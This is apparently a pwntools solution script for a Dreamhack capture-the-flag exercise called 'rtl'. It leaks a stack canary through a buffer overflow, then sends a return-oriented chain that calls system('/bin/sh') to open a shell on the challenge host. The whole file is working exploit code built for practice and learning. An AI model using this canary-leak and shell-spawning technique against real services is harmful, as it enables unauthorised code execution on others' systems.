from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/ret2lib/rtl')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:8344'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#first leak
payload = b"A"*56 + b"G"
p.recvuntil(b": ")
p.send(payload)

p.recvuntil(b"G")
data = p.recv(7)
val = u64(data.rjust(8, b"\x00"))

print(f"canary value is {hex(val)}")

pop_rdi_ret = 0x400853
ret = 0x400596
binsh = 0x400874
system_plt = elf.plt[b'system']

#build payload
payload = ( b"A"*56 + #buf
            p64(val) + #canary
            b"B"*8 + #rbp
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) + 
            p64(system_plt)
          )
          
p.sendline(payload)
p.interactive()
